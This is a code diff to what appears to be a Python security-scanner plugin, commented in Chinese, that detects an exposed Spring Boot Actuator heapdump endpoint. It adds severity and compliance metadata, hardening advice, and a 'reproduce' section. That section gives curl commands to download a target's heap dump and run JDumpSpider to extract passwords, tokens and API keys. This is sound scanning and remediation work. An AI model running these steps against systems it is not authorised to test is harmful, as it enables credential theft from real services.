@@ -14,11 +14,45 @@ HEAP_MARKER = 'spring-heapdump-leak-confirmed'
 
 class SpringHeapdumpLeakPlugin(PluginBase):
     name = 'Spring Boot Actuator heapdump 敏感信息泄露'
-    cve = ''
+    cve = 'N/A'
     severity = 'medium'
+    # D12：CVSS v3.1 + 合规映射
+    cvss_vector = 'AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N'
+    compliance = '等保2.0:8.1.4;OWASP:A01:2021'
     category = 'vuln'
     description = '/actuator/heapdump 可匿名下载堆转储，内含口令/密钥/Token 等敏感信息'
     fix = '为 /actuator/heapdump 端点配置认证；或设置 management.endpoints.web.exposure.exclude=heapdump'
+    fix_detail = (
+        '【引入依赖】pom.xml 添加 Spring Security：\n'
+        '  <dependency><groupId>org.springframework.boot</groupId><artifactId>spring-boot-starter-security</artifactId></dependency>\n'
+        '【配置加固】application.yml 禁用 heapdump 端点：\n'
+        '  management.endpoints.web.exposure.include: health,info\n'
+        '  management.endpoints.web.exposure.exclude: heapdump\n'
+        '  management.endpoint.heapdump.enabled: false  # 直接禁用\n'
+        '【SecurityConfig】为 heapdump 端点配置角色：\n'
+        '  .antMatchers("/actuator/heapdump").hasRole("ADMIN")\n'
+        '【端口隔离】management.server.port: 9090  # 管理端口与业务端口分离，仅内网访问\n'
+        '【WAF 规则】拦截外网对 /actuator/heapdump 的访问，限制大文件下载\n'
+        '【合规】OWASP A05:2021 安全配置错误；等保 2.0 8.1.4 访问控制'
+    )
+    reproduce = (
+        '# 1. 探测 heapdump 端点可达性：\n'
+        'curl -I "http://target/actuator/heapdump"\n'
+        '  # 返回 200 + Content-Type: application/octet-stream 即 heapdump 暴露\n'
+        '\n'
+        '# 2. 下载 JVM 堆转储文件：\n'
+        'curl "http://target/actuator/heapdump" -o heapdump.bin\n'
+        '  # 文件大小通常为 100MB ~ 数 GB\n'
+        '\n'
+        '# 3. 解压 gzip 堆转储（Spring Boot 2.x 默认 gzip 压缩）：\n'
+        'mv heapdump.bin heapdump.gz && gunzip heapdump.gz\n'
+        '\n'
+        '# 4. 使用 Eclipse MAT / jhat / JDumpSpider 提取敏感信息：\n'
+        'java -jar JDumpSpider.jar heapdump\n'
+        '  # 提取 password / jwt / token / apiKey 等明文凭证\n'
+        '\n'
+        '# 预期响应：200 + Content-Type: application/octet-stream 即漏洞存在'
+    )
 
     def verify(self, target, session):
         url = join_url(target, '/actuator/heapdump')
